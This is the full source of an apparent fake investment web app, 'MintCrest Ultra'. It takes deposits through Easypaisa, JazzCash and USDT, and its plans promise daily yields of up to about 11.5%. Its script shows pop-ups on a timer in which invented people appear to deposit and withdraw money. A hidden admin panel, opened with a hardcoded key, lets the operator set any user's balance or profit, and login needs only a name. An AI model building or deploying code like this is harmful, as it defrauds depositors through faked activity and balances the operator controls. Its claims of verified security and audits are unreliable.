<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Ultra | Verified Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-main { background: linear-gradient(135deg, #0062ff 0%, #00d4ff 100%); }
        .page { display: none; height: 100%; overflow-y: auto; padding-bottom: 120px; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .nav-btn { filter: grayscale(1); opacity: 0.4; transition: 0.3s; }
        .active-tab { filter: grayscale(0); opacity: 1; color: #00d4ff; }
        .fake-notif { position: fixed; top: 10px; left: 50%; transform: translateX(-50%); z-index: 10000; width: 90%; pointer-events: none; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="fake-notif-box" class="fake-notif hidden">
        <div class="glass p-3 rounded-2xl flex items-center gap-3 border-l-4 border-green-500 shadow-2xl">
            <div class="w-8 h-8 grad-main rounded-full flex items-center justify-center text-[10px]">💰</div>
            <div>
                <p id="notif-text" class="text-[9px] font-bold uppercase"></p>
                <p class="text-[7px] opacity-50">Just Now • Verified</p>
            </div>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex flex-col items-center justify-center p-8">
        <h1 onclick="adminTap()" class="text-4xl font-black mb-2 italic tracking-tighter text-white">MINTCREST</h1>
        <p class="text-[9px] uppercase tracking-widest text-blue-500 mb-8">Asset Management Node</p>
        <div class="glass p-8 rounded-[3rem] w-full max-w-xs text-center border-t border-white/10">
            <input type="text" id="user-name" placeholder="Enter Full Name" class="w-full bg-white/5 p-4 rounded-2xl mb-4 text-center font-bold outline-none border border-white/10">
            <button onclick="login()" class="w-full grad-main py-4 rounded-2xl font-black uppercase text-xs">Access Vault</button>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 relative">
        
        <div id="p-home" class="page active-page p-6">
            <div class="flex justify-between items-center mb-6">
                <div>
                    <h2 class="font-black text-lg" id="v-user">User</h2>
                    <span id="vip-badge" class="text-[8px] font-bold bg-yellow-500/20 text-yellow-500 px-2 py-1 rounded-md">VIP 0</span>
                </div>
                <button onclick="changePage('spin')" class="text-2xl animate-bounce">🎡</button>
            </div>

            <div class="grad-main p-8 rounded-[2.5rem] mb-6 shadow-2xl relative overflow-hidden">
                <p class="text-[10px] font-black opacity-80 uppercase italic">Capital Node Value</p>
                <h2 class="text-4xl font-black" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex justify-between items-center border-t border-white/10 pt-4">
                    <div class="text-[10px] font-bold uppercase text-cyan-200">Profit: <span id="v-profit">₨ 0</span></div>
                    <button onclick="copyRef()" class="bg-white/10 px-3 py-1 rounded-lg text-[8px] font-black uppercase tracking-widest">Share Node</button>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-3 mb-6">
                <button onclick="claimDailyBonus()" class="glass p-4 rounded-2xl text-[10px] font-black uppercase border-b-2 border-yellow-500">🎁 Daily Bonus</button>
                <button onclick="applyPromo()" class="glass p-4 rounded-2xl text-[10px] font-black uppercase border-b-2 border-cyan-500">🎟️ Promo Code</button>
            </div>

            <div class="glass p-5 rounded-[2rem] mb-6 border-l-4 border-blue-500">
                <h3 class="text-[10px] font-black text-blue-400 uppercase mb-2">Verified Security V16</h3>
                <p class="text-[9px] opacity-60 leading-relaxed">Your assets are secured by the MintCrest Liquidity Node. Profit is manually audited for 100% accuracy. <span class="text-blue-400 underline font-bold" onclick="changePage('legal')">About Us</span></p>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass py-6 rounded-3xl font-black text-[10px] uppercase">Deposit</button>
                <button onclick="changePage('withdraw')" class="glass py-6 rounded-3xl font-black text-[10px] uppercase text-rose-500">Withdraw</button>
            </div>
        </div>

        <div id="p-spin" class="page p-6 text-center">
            <h2 class="text-2xl font-black mb-8 italic uppercase text-cyan-400">Lucky Node Spin</h2>
            <div id="wheel" class="w-64 h-64 mx-auto border-8 border-cyan-500 rounded-full flex items-center justify-center relative shadow-[0_0_50px_rgba(0,212,255,0.2)]">
                <div class="font-black text-4xl">💎</div>
                <div class="absolute -top-4 w-4 h-10 bg-rose-500 rounded-full"></div>
            </div>
            <button id="spin-btn" onclick="spinWheel()" class="mt-12 w-full grad-main py-5 rounded-3xl font-black uppercase shadow-xl tracking-widest">Activate Spin</button>
            <p class="mt-4 text-[10px] opacity-50 uppercase font-bold">Resets Every 24 Hours</p>
        </div>

        <div id="p-wallet" class="page p-6">
            <h3 class="text-center font-black uppercase text-cyan-400 mb-6 italic tracking-widest">Funding Gateway</h3>
            <div class="space-y-3 mb-6">
                <div onclick="selM('Easypaisa','03705519562')" class="glass p-4 rounded-2xl flex justify-between items-center cursor-pointer"><span>Easypaisa</span><span class="text-[10px] font-black italic">0370...562</span></div>
                <div onclick="selM('JazzCash','0300XXXXXXX')" class="glass p-4 rounded-2xl flex justify-between items-center cursor-pointer"><span>JazzCash</span><span class="text-[10px] font-black italic">0300...XXX</span></div>
                <div onclick="selM('Binance (TRC20)','YOUR-TRC20-ADDR')" class="glass p-4 rounded-2xl flex justify-between items-center cursor-pointer"><span>Binance</span><span class="text-[10px] font-black text-yellow-500">USDT</span></div>
            </div>
            <div id="dep-box" class="hidden glass p-6 rounded-[3rem] border-2 border-cyan-500/20">
                <p id="m-info" class="text-center text-[10px] font-black mb-4 text-cyan-400 uppercase"></p>
                <input type="number" id="d-amt" placeholder="Amount (Min 200)" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold outline-none border border-white/10">
                <input type="text" id="d-tid" placeholder="TID / TRX Hash ID" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center uppercase outline-none border border-white/10">
                <p class="text-[9px] mb-2 font-black opacity-50 uppercase tracking-widest">Upload Payment Screenshot:</p>
                <input type="file" id="d-file" accept="image/*" class="w-full text-[10px] mb-6">
                <button onclick="subDep()" class="w-full grad-main py-4 rounded-2xl font-black text-[10px] uppercase shadow-lg">Verify Assets</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-4 border-rose-500 text-center">
                <h3 class="font-black text-rose-500 mb-6 uppercase tracking-widest italic">Capital Outflow</h3>
                <input type="number" id="w-amt" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-bold outline-none">
                <input type="text" id="w-acc" placeholder="Account Details (Name/No)" class="w-full bg-white/5 p-4 rounded-xl mb-8 text-center text-xs outline-none">
                <button onclick="subWd()" class="w-full bg-rose-600 py-4 rounded-2xl font-black text-xs uppercase shadow-lg">Submit Request</button>
            </div>
        </div>

        <div id="p-support" class="page p-6">
            <div class="glass p-8 rounded-[3rem] text-center border-t-4 border-green-500">
                <h2 class="font-black text-green-500 mb-4 uppercase italic">Official Help Desk</h2>
                <p class="text-[11px] opacity-70 mb-8 leading-relaxed">Facing an issue? Contact our global support team or join the community group for live updates.</p>
                
                <button onclick="window.open('https://chat.whatsapp.com/YOUR_GROUP_LINK')" class="w-full bg-green-600 py-4 rounded-2xl font-black text-[11px] uppercase mb-4 shadow-lg flex items-center justify-center gap-2">
                    <span>🟢 Join WhatsApp Group</span>
                </button>
                <button onclick="window.open('https://wa.me/YOUR_ADMIN_NUMBER')" class="w-full glass py-4 rounded-2xl font-black text-[11px] uppercase shadow-lg flex items-center justify-center gap-2">
                    <span>💬 Contact Support</span>
                </button>
            </div>
        </div>

        <div id="p-legal" class="page p-6">
            <div class="glass p-8 rounded-[3rem]">
                <h2 class="font-black text-blue-400 mb-4 uppercase italic">Integrity & Policy</h2>
                <div class="space-y-4 text-[10px] opacity-70 leading-relaxed">
                    <p>**About MintCrest:** Established as a decentralized asset pool in 2024, providing secure 30-day liquidity cycles to global members.</p>
                    <p>**Data Privacy:** All transaction screenshots are manual-verified and then encrypted to ensure 100% user anonymity.</p>
                    <p>**Node Terms:** Withdrawals are processed within 24 hours. Fixed 30-day cycles apply to all capital fleet investments.</p>
                </div>
                <button onclick="changePage('home')" class="mt-8 text-[10px] font-black text-blue-400 underline uppercase italic">Return to Dashboard</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6"><div id="plans-list" class="space-y-3 pb-10"></div></div>
        <div id="p-activity" class="page p-6"><div id="user-history" class="space-y-3 pb-10"></div></div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000814] z-[5000] hidden overflow-y-auto p-6">
        <div class="flex justify-between items-center mb-8 border-b border-white/10 pb-4">
            <h2 class="text-xl font-black text-cyan-400 italic uppercase">Administration Node</h2>
            <button onclick="closeAdm()" class="bg-rose-600 px-4 py-1 rounded-lg text-[9px] font-black uppercase italic">Exit</button>
        </div>
        <div class="glass p-5 rounded-2xl mb-8 border-l-4 border-cyan-400">
            <p class="text-[9px] font-black mb-3 text-cyan-400 uppercase tracking-widest">Direct Control (Unlimited)</p>
            <input type="text" id="adm-u" placeholder="Target Username" class="w-full bg-white/5 p-3 rounded-xl text-xs mb-2 outline-none border border-white/10">
            <input type="number" id="adm-v" placeholder="Amount Value" class="w-full bg-white/5 p-3 rounded-xl text-xs mb-3 outline-none border border-white/10">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="editU('balance')" class="grad-main py-3 rounded-xl text-[8px] font-black italic">SET BALANCE</button>
                <button onclick="editU('profit')" class="grad-main py-3 rounded-xl text-[8px] font-black italic">SET PROFIT</button>
            </div>
        </div>
        <div id="adm-reqs" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-6 flex justify-around items-center fixed bottom-0 w-full z-[200] rounded-t-[3rem] border-t border-white/10">
        <button onclick="changePage('home')" id="n-home" class="nav-btn text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="nav-btn text-2xl">📜</button>
        <button onclick="changePage('support')" id="n-support" class="nav-btn text-2xl">🎧</button>
    </nav>

    <script>
        // Updated Firebase Config (Sweetie, keep it same)
        const firebaseConfig = {
            apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg",
            authDomain: "investment-84f4e.firebaseapp.com",
            projectId: "investment-84f4e",
            storageBucket: "investment-84f4e.firebasestorage.app",
            messagingSenderId: "975293889308",
            appId: "1:975293889308:web:6d034a99cc966c75ff58d9"
        };
        firebase.initializeApp(firebaseConfig); 
        const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0; let curM = '';

        const plans = [];
        for(let i=1; i<=25; i++) {
            plans.push({ n: `Titan Fleet ${i} (30D)`, p: 200 + (i-1)*500, r: (1.5 + i*0.4).toFixed(1) });
        }

        async function login() {
            const n = document.getElementById('user-name').value.trim(); if(!n) return;
            const ref = db.collection("users").doc(n); const d = await ref.get();
            if(!d.exists) await ref.set({ name: n, balance: 0, profit: 0, lastB: 0, lastP: 0, lastS: 0, totalDep: 0 });
            user = (await ref.get()).data();
            document.getElementById('v-user').innerText = n;
            document.getElementById('auth-ui').style.display='none';
            document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            startSync(n); renderPlans(); showFakeNotifs();
        }

        async function claimDailyBonus() {
            if(Date.now() - (user.lastB || 0) < 86400000) return alert("Sweetie, wait for 24 hours! 😘");
            await db.collection("requests").add({ user: user.name, type: "Daily Bonus Request", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ lastB: Date.now() });
            alert("Bonus Request Sent! 🎁");
        }

        async function spinWheel() {
            if(Date.now() - (user.lastS || 0) < 86400000) return alert("Come back in 24h, sweetie! 😘");
            document.getElementById('wheel').style.transition = "4s cubic-bezier(0.1, 0, 0, 1)";
            document.getElementById('wheel').style.transform = "rotate(3600deg)";
            setTimeout(async () => {
                await db.collection("requests").add({ user: user.name, type: "Spin Reward Request", status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastS: Date.now() });
                alert("Lucky Spin Logged! Admin will add your reward. 💎");
                document.getElementById('wheel').style.transform = "rotate(0deg)";
            }, 4500);
        }

        function showFakeNotifs() {
            const names = ["Sultan", "Hania", "Adnan", "Mehak", "Arham", "Saba", "Faisal"];
            const amounts = ["400", "1200", "5000", "10000", "350"];
            setInterval(() => {
                const box = document.getElementById('fake-notif-box');
                const text = document.getElementById('notif-text');
                const isDep = Math.random() > 0.5;
                text.innerText = isDep ? `${names[Math.floor(Math.random()*names.length)]} deposited ₨ ${amounts[Math.floor(Math.random()*amounts.length)]}` : `${names[Math.floor(Math.random()*names.length)]} withdrew ₨ ${amounts[Math.floor(Math.random()*amounts.length)]}`;
                box.classList.remove('hidden');
                setTimeout(() => box.classList.add('hidden'), 4000);
            }, 12000);
        }

        async function subWd() {
            const a = parseInt(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value;
            if(!a || a > user.balance || a < 100) return alert("Insufficient Node Balance!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: acc, type: "Withdrawal", status: "pending", time: Date.now() });
            alert("Withdrawal Processed! 😘"); location.reload();
        }

        function selM(m, a) { curM = m; document.getElementById('dep-box').classList.remove('hidden'); document.getElementById('m-info').innerText = `TRANSFER TO ${m}: ${a}`; }

        async function subDep() {
            const a = parseInt(document.getElementById('d-amt').value); const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(a < 200 || !t || !f) return alert("Error: Complete all steps, sweetie! 😘");
            const sRef = storage.ref(`proofs/${Date.now()}_${user.name}`); await sRef.put(f);
            const url = await sRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: url, type: "Deposit", status: "pending", time: Date.now() });
            alert("Assets Pending Verification! ✨"); location.reload();
        }

        function startSync(n) {
            db.collection("users").doc(n).onSnapshot(d => { 
                user = d.data(); 
                document.getElementById('v-bal').innerText = "₨ "+(user.balance||0).toLocaleString(); 
                document.getElementById('v-profit').innerText = "₨ "+(user.profit||0).toLocaleString();
                const v = user.totalDep >= 15000 ? 2 : (user.totalDep >= 5000 ? 1 : 0);
                document.getElementById('vip-badge').innerText = "VIP "+v;
            });
            db.collection("requests").where("user", "==", n).orderBy("time", "desc").limit(10).onSnapshot(s => {
                const l = document.getElementById('user-history'); l.innerHTML = '<h3 class="font-black text-cyan-400 uppercase text-center mb-6">Master Activity Log</h3>';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between text-[10px] uppercase font-bold mb-2"><span>${x.type}</span><span class="${x.status === 'pending' ? 'text-yellow-500' : 'text-green-500'}">${x.status}</span></div>`; });
            });
        }

        function renderPlans() {
            const l = document.getElementById('plans-list'); l.innerHTML = '<h3 class="font-black text-cyan-400 uppercase text-center mb-6 italic tracking-widest text-lg">CAPITAL FLEETS (30D)</h3>';
            plans.forEach(p => { l.innerHTML += `<div class="glass p-6 rounded-[2rem] flex justify-between items-center mb-3"><div class="text-left"><h4 class="font-black text-[10px] uppercase tracking-widest">${p.n}</h4><p class="text-[9px] text-blue-400 font-black italic">${p.r}% Yield/Day</p></div><div class="font-black text-xs italic">₨ ${p.p}</div></div>`; });
        }

        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Enter Admin Node Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdm() { document.getElementById('admin-panel').classList.add('hidden'); }
        async function editU(f) { const u = document.getElementById('adm-u').value; const v = parseInt(document.getElementById('adm-v').value); await db.collection("users").doc(u).update({ [f]: v }); alert("Command Executed!"); }

        function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const l = document.getElementById('adm-reqs'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-5 rounded-2xl border-l-4 border-cyan-400 mb-4"><p class="text-[10px] font-black uppercase text-cyan-400 mb-1">${x.user} | ${x.type}</p><p class="text-[9px] font-bold opacity-60">Amt: ${x.amount || 0} | TID/Acc: ${x.tid || x.acc || 'N/A'}</p>${x.proof ? `<a href="${x.proof}" target="_blank" class="block bg-cyan-600 text-center py-2 rounded-xl text-[8px] font-black mt-3 uppercase">Verify Screenshot</a>` : ''}<div class="flex gap-2 mt-4"><button onclick="hnd('${d.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 grad-main py-3 rounded-xl text-[9px] font-black uppercase italic">Approve</button><button onclick="hnd('${d.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-rose-600 py-3 rounded-xl text-[9px] font-black uppercase italic">Reject</button></div></div>`; });
            });
        }

        async function hnd(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved') {
                if(type.includes("Bonus") || type.includes("Promo") || type.includes("Spin")) { const b = parseInt(prompt("Set Manual Reward for "+u+":")); await ref.update({ balance: (d.data().balance||0) + b }); }
                else if(type === "Deposit") await ref.update({ balance: (d.data().balance||0) + amt, totalDep: (d.data().totalDep||0) + amt });
            } else if(act==='rejected' && type === 'Withdrawal') { await ref.update({ balance: (d.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act });
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p).classList.add('active-tab'); }
        function copyRef() { const link = window.location.href + "?node=" + user.name; navigator.clipboard.writeText(link); alert("Node Invite Copied! 🔗"); }
    </script>
</body>
</html>
